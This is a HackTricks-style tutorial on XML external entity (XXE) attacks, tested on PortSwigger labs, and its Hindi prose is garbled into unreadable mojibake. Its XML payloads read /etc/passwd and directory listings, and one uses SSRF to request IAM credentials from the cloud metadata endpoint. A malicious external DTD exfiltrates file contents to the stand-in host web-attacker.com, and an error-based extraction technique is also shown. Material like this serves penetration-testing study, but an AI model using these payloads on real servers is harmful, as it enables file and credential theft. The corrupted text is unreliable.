# XXE - XEE - XML рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>


## XML рдореВрд▓рднреВрдд

XML рдПрдХ рдорд╛рд░реНрдХрдЕрдк рднрд╛рд╖рд╛ рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░реЗрдЬ рдФрд░ рдкрд░рд┐рд╡рд╣рди рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХреА рдЧрдИ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд▓рдЪреАрд▓рд╛ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬреЛ рд╡рд░реНрдгрдирд╛рддреНрдордХ рдирд╛рдорд┐рдд рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ HTML рд╕реЗ рднрд┐рдиреНрди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреИрдЧ рд╕реЗрдЯ рд╕реЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИред XML рдХрд╛ рдорд╣рддреНрд╡ JSON рдХреЗ рдЙрдЫрд╛рд▓ рдХреЗ рд╕рд╛рде рдХрдо рд╣реЛ рдЧрдпрд╛ рд╣реИ, рднрд▓реЗ рд╣реА рдЗрд╕рдХреА рдкреНрд░рд╛рд░рдВрднрд┐рдХ рднреВрдорд┐рдХрд╛ AJAX рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдореЗрдВ рдереАред

- **рдПрдВрдЯрд┐рдЯреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡**: XML рдореЗрдВ рдПрдВрдЯрд┐рдЯреА рдбреЗрдЯрд╛ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рд╕рдВрднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рдЬреИрд╕реЗ `&lt;` рдФрд░ `&gt;`, рдЬреЛ `<` рдФрд░ `>` рдХреЗ рд╕рдорд░реНрдерди рдХреЗ рд▓рд┐рдП рд╣реИрдВ рддрд╛рдХрд┐ XML рдХреЗ рдЯреИрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рд╕рдВрдШрд░реНрд╖ рди рд╣реЛред

- **XML рддрддреНрд╡реЛрдВ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛**: XML рддрддреНрд╡реЛрдВ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рддрддреНрд╡реЛрдВ рдХреЛ рдХреИрд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдирдореЗрдВ рдХреМрди рд╕реА рд╕рд╛рдордЧреНрд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕рд╛рдордЧреНрд░реА рд╕реЗ рд╡рд┐рд╢реЗрд╖ рдмрдЪреНрдЪрд╛ рддрддреНрд╡реЛрдВ рддрдХред

- **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд╛ (DTD)**: DTD XML рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╕рдВрд░рдЪрдирд╛ рдФрд░ рдЙрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдбреЗрдЯрд╛ рдХреА рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВред рд╡реЗ рдЖрдВрддрд░рд┐рдХ, рдмрд╛рд╣реНрдп, рдпрд╛ рдПрдХ рд╕рдВрдпреЛрдЬрди рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдХреИрд╕реЗ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЙрд╕рдХреЗ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдХрд░рддреЗ рд╣реИрдВред

- **рдХрд╕реНрдЯрдо рдФрд░ рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА**: XML DTD рдореЗрдВ рд▓рдЪреАрд▓реЗ рдбреЗрдЯрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреА рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред URL рдХреЗ рд╕рд╛рде рдкрд░рд┐рднрд╛рд╖рд┐рдд рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ XML рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА (XXE) рд╣рдорд▓реЛрдВ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдЪрд┐рдВрддрд╛рдПрдВ рдЙрдард╛рддреЗ рд╣реИрдВ, рдЬреЛ XML рдкрд╛рд░реНрд╕рд░реНрд╕ рдХреЗ рдмрд╛рд╣реНрдп рдбреЗрдЯрд╛ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдХрд╛ рд╢реЛрдз рдХрд░рддреЗ рд╣реИрдВ: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рд╕рд╛рде XXE рдбрд┐рдЯреЗрдХреНрд╢рди**: XXE рд╡рдВрд╢рд╛рд╡рд▓реА рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдкрд╛рд░реНрд╕рд░ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЗ рдХрд╛рд░рдг рд╕рд╛рдорд╛рдиреНрдп рд╡рд┐рдзрд┐рдпрд╛рдБ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ, XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпреЗ рдПрдВрдЯрд┐рдЯреА рдмрд╛рд╣реНрдп-рдмреИрдВрдб рдбрд┐рдЯреЗрдХреНрд╢рди рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ DNS рд▓реБрдХрдЕрдк рдпрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЛрдореЗрди рдкрд░ HTTP рдЕрдиреБрд░реЛрдз рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкреА рд░реВрдк рд╕реЗ XXE рд╡рдВрд╢рд╛рд╡рд▓реА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## рдореБрдЦреНрдп рд╣рдорд▓реЗ

**[рдЗрди рд╣рдорд▓реЛрдВ рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рдкреЛрд░реНрдЯрд╕реНрд╡рд┐рдЧрд░реНрд╕ XEE рд▓реИрдмреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### рдирдИ рдПрдВрдЯрд┐рдЯреА рдкрд░реАрдХреНрд╖рдг

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рдореИрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдирдИ рдПрдВрдЯрд┐рдЯреА рдШреЛрд╖рдгрд╛ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ

рд╣рдо рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рд╕реЗ `/etc/passwd` рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВрдЧреЗред Windows рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `C:\windows\system32\drivers\etc\hosts`

рдЗрд╕ рдкрд╣рд▓реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ SYSTEM "_\*\*file:///\*\*etc/passwd_" рднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

рдпрд╣ рджреВрд╕рд░рд╛ рдорд╛рдорд▓рд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЕрдЧрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ (рдкреЛрд░реНрдЯрд╕реНрд╡рд┐рдЧрд░реНрд╕ рд▓реИрдмреНрд╕ рдХрд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реИ)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
рдЗрд╕ рддреАрд╕рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `Element stockCheck` рдХреЛ ANY рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА

**рдЬрд╛рд╡рд╛** рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдРрд╕рд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ (рдлрд╝рд╛рдЗрд▓ рдХреЗ рдмрдЬрд╛рдп рдХреЗрд╡рд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреВрдЫрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

рдПрдХ XXE рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рджрд▓ рдореЗрдВ рдПрдХ SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### рдмреНрд▓рд╛рдЗрдВрдб рдПрд╕рдПрд╕рдЖрд░рдПрдл

**рдкрд╣рд▓реЗ рдХрдореЗрдВрдЯ рдХреА рдЧрдИ рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЕрдкрдиреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рджрд┐рдЦрд╛ рд╕рдХреЗред рд▓реЗрдХрд┐рди, рдЕрдЧрд░ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ, рд╢рд╛рдпрдж рдпрд╣ **рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреАрдЬ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдПрдХреНрд╕рдПрдордПрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "рдЕрдВрдзрд╛" SSRF - рдбреЗрдЯрд╛ рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб рдирд┐рдХрд╛рд▓реЗрдВ

**рдЗрд╕ рдЕрд╡рд╕рд░ рдкрд░ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдирдпрд╛ DTD рд▓реЛрдб рдХрд░рд╛рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреЗрд▓реЛрдб рд╣реЛрдЧрд╛ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ (рдмрд╣реБ-рд▓рд╛рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реЗ** _**ftp://**_**рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдпрд╣ рд╡реНрдпрд╛рдЦреНрдпрд╛рди** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)** рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред**

рджрд┐рдП рдЧрдП рд╣рд╛рдирд┐рдХрд╛рд░рдХ DTD рдореЗрдВ, рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХрджрдо рдЪрд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ:

### рд╣рд╛рдирд┐рдХрд╛рд░рдХ DTD рдЙрджрд╛рд╣рд░рдг:
рд╕рдВрд░рдЪрдирд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
рдЗрд╕ DTD рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдЪрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

1. **рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреА рдкрд░рд┐рднрд╛рд╖рд╛:**
- рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА, `%file`, рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, `/etc/hostname` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝рддреА рд╣реИред
- рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА, `%eval`, рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рдирдпреА XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА, `%exfiltrate`, рдбрд╛рдпрдиреЗрдорд┐рдХ рд░реВрдк рд╕реЗ рдШреЛрд╖рд┐рдд рдХрд░рддреА рд╣реИред `%exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХреЛ рдЕрдЯреИрдХрд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ HTTP рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, URL рдХреЗ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ `%file` рдПрдВрдЯрд┐рдЯреА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реБрдПред

2. **рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди:**
- `%eval` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `%exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХреЗ рдбрд╛рдпрдиреЗрдорд┐рдХ рдШреЛрд╖рдгрд╛ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрддрд╛ рд╣реИред
- рдлрд┐рд░ `%exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдкрд░ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде HTTP рдЕрдиреБрд░реЛрдз рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рдд рдпрд╣ рджреБрд░реБрдкрдпреЛрдЧреА DTD рдЕрдХреНрд╕рд░ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ рд╕рд░реНрд╡рд░ рдкрд░ рд╣реЛрд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: рдПрдХ URL рдкрд░ рдЬреИрд╕реЗ `http://web-attacker.com/malicious.dtd`ред

**XXE рдкреЗрд▓реЛрдб:**
рдПрдХ рд╡рд┐рдХрд▓реНрдкреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдПрдХ XXE рдкреЗрд▓реЛрдб рднреЗрдЬрддрд╛ рд╣реИ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд (рдмрд╛рд╣реНрдп DTD)

**рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DTD рд▓реЛрдб рдХрд░рд╛рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рднреАрддрд░ рджрд┐рдЦрд╛рдПрдЧрд╛ (рдпрд╣ рдХреЗрд╡рд▓ рддрднреА рдорд╛рдиреНрдп рд╣реИ рдЕрдЧрд░ рдЖрдк рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ)ред** [**рдпрд╣рд╛рдВ рд╕реЗ рдЙрджрд╛рд╣рд░рдгред**](https://portswigger.net/web-security/xxe/blind)

рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рдмрд╛рд╣реНрдп рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рдг (DTD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрдЯ рд╣реЛрддреА рд╣реИред рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

1. `file` рдирд╛рдордХ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИред
2. `eval` рдирд╛рдордХ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА `error` рдХреЗ рд▓рд┐рдП рдПрдХ рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред рдпрд╣ `error` рдПрдВрдЯрд┐рдЯреА, рдЬрдм рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `file` рдПрдВрдЯрд┐рдЯреА рдХреА рд╕рд╛рдордЧреНрд░реА рдЙрд╕рдХрд╛ рдирд╛рдо рд╣реЛрддреА рд╣реИред
